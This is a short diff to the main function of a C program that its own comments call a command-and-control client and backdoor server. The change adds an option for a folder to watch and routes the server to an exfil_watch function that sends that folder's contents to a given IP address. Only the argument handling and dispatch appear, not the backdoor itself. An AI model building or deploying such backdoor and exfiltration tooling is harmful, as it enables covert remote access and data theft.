@@ -40,13 +40,15 @@ int main(int argc, char *argv[])
 	int duplex = 0;
 	char rmthost[MAX_LEN];
 	char filter[MAX_LEN];
+	char folder[MAX_LEN];
 	int port = DEF_PRT;
 	uint32 ipaddr;
 	
 	strncpy(rmthost, DEF_ADR, MAX_LEN);
 	strncpy(filter, DEF_FLT, MAX_LEN);
+	strncpy(folder, DEF_WCH, MAX_LEN);
 
-	while ((c = getopt(argc, argv, ":csdhi:p:f:")) != -1)
+	while ((c = getopt(argc, argv, ":csdhi:p:f:w:")) != -1)
 	{
 		switch(c) 
 		{
@@ -64,6 +66,9 @@ int main(int argc, char *argv[])
 				break;
 			case 'f':
 				strncpy(filter, optarg, MAX_LEN);
+				break;
+			case 'w':
+				strncpy(folder, optarg, MAX_LEN);
 				break;
 			case 'p':
 				port = atoi(optarg);
@@ -90,16 +95,16 @@ int main(int argc, char *argv[])
 	if (client) // C&C Client
 	{
 		// Start command entry
-		backdoor_client(ipaddr, port, duplex);
+		//backdoor_client(ipaddr, port, duplex);
 		// Start exfil listener
-		exfil_listen();
+		exfil_listen(ipaddr);
 	}
 	else // Backdoor Server
 	{
-		pcap_init(filter);
+		exfil_watch(ipaddr, folder);
 
-		exfil_start(ipaddr);
-		srv_listen(duplex);
+		//pcap_init(filter, duplex);
+
 	}
 	
 	return 0;
